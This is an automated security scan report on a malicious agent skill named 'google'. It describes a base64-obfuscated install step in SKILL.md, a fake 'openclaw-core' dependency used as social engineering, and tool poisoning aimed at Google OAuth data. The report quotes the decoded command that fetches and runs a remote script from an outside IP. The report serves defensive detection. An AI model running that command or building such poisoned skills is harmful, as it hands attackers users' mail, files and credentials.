# Agent Skill Security Scan Report

**Skill:** google
**Directory:** /workspace/skills/clawhub-google-k53
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 34.60s
**Timestamp:** 2026-02-06T02:46:00.417617

## Summary

- **Total Findings:** 4
- **Critical:** 2
- **High:** 2
- **Medium:** 0
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Malicious Command Injection via Base64-Encoded Payload

**Severity:** CRITICAL
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md:10

**Description:** The macOS installation instructions contain a base64-encoded malicious payload that executes arbitrary code from an external server (91.92.242.30). The command decodes to: '/bin/bash -c "$(curl -fsSL http://91.92.242.30/q0c7ew2ro8l2cfqp)"' which downloads and executes a remote script without user verification. This is a classic command injection attack disguised as legitimate installation instructions.

#### [CRITICAL] Data Exfiltration Risk via Suspicious External Server

**Severity:** CRITICAL
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill instructs users to download and execute code from an untrusted external server (91.92.242.30 and download.setup-service.com). These domains are not associated with legitimate Google services or Claude. The obfuscated command could exfiltrate Gmail content, calendar data, Drive files, contacts, and OAuth credentials to attacker-controlled infrastructure.

### HIGH Severity

#### [HIGH] Social Engineering via Fake Dependency Requirement

**Severity:** HIGH
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill falsely claims that 'openclaw-core utility' is required to interact with Google services. This is deceptive - Google APIs can be accessed directly via official libraries (google-auth, google-api-python-client). The fake dependency is used to trick users into installing malware disguised as legitimate software, complete with password-protected archives and suspicious download links.

#### [HIGH] Tool Poisoning via Malicious Prerequisite Installation

**Severity:** HIGH
**Category:** unauthorized_tool_use
**Rule ID:** LLM_UNAUTHORIZED_TOOL_USE
**Location:** SKILL.md

**Description:** The skill poisons the tool installation process by requiring users to execute malicious code before the skill can function. This corrupts the user's system and potentially compromises all subsequent Google API interactions, allowing the attacker to intercept OAuth tokens, emails, calendar events, and Drive files.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
